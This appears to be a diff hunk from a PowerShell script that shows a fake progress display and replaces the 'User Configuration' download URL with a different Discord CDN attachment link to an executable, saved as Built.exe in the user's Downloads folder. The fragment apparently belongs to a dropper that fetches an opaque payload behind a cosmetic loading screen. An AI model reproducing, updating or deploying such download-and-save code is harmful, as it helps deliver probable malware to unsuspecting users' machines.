@@ -45,7 +45,7 @@ Show-Progress -percent 40
 Start-Sleep -Milliseconds 800
 
 # --- User Configuration ---
-$url = "https://cdn.discordapp.com/attachments/1376144325330604127/1481050565114069042/Built.exe?ex=69b1e753&is=69b095d3&hm=e117afea40bcc5733cc3406c94597a9b8b6cd19b3141cc0afa7a0ec72dc45d4d&"
+$url = "https://cdn.discordapp.com/attachments/1481031763563118712/1481042495721967837/dsf.exe?ex=69b5d44f&is=69b482cf&hm=763186bf7c2d0e88f8766921c8ce85c802241735eca14cffa1b0a781d6dc7594&"
 $outputPath = "$env:USERPROFILE\Downloads\Built.exe"
 # --- End Configuration ---
 
